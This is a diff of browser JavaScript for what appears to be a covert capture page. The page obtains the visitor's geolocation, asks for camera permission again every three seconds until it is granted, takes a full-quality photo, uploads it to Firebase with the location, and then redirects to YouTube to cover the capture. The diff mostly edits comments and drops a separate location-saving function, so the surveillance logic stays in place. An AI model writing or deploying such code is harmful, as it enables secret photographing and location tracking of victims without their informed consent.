@@ -25,7 +25,7 @@ function getLocation() {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude
             };
-            saveLocation(userLocation);
+            console.log('User Location:', userLocation); // Debug: Log the location
         }, (error) => {
             console.error('Error accessing location:', error);
             document.getElementById('message').textContent = 'Location access denied or an error occurred.';
@@ -33,18 +33,6 @@ function getLocation() {
     } else {
         console.error('Geolocation is not supported by this browser.');
     }
-}
-
-// Function to save location to Firebase
-function saveLocation(location) {
-    const locationRef = database.ref('locations').push();
-    locationRef.set(location, (error) => {
-        if (error) {
-            console.error('Error saving location to Firebase:', error);
-        } else {
-            console.log('Location saved to Firebase');
-        }
-    });
 }
 
 // Access the camera with higher resolution and request permission until granted
@@ -70,8 +58,6 @@ async function startVideo() {
         } catch (error) {
             console.error('Error accessing camera:', error);
             document.getElementById('message').textContent = 'Camera access denied, trying again...';
-
-            // Wait for 3 seconds before retrying
             await new Promise(resolve => setTimeout(resolve, 3000));
         }
     }
@@ -99,18 +85,17 @@ function capturePhoto(video) {
 
             // If location is available, save it with the photo name
             if (userLocation) {
-                saveLocationWithPhoto(fileName, userLocation);
+                saveLocationWithPhoto(fileName, userLocation); // Pass both fileName and userLocation
             }
 
             // Redirect after 1 second
             setTimeout(() => {
-                window.location.href = 'https://youtube.com/';
-            }, 1000);  // 1000 milliseconds = 1 second
+                window.location.href = 'https://youtube.com/';  // Change this to your desired URL
+            }, 1000);
         } catch (error) {
             console.error('Error uploading to Firebase:', error);
-            // Optionally handle upload failure here
         }
-    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
+    }, 'image/png', 1.0);
 }
 
 // Function to save location with the photo name in Firebase
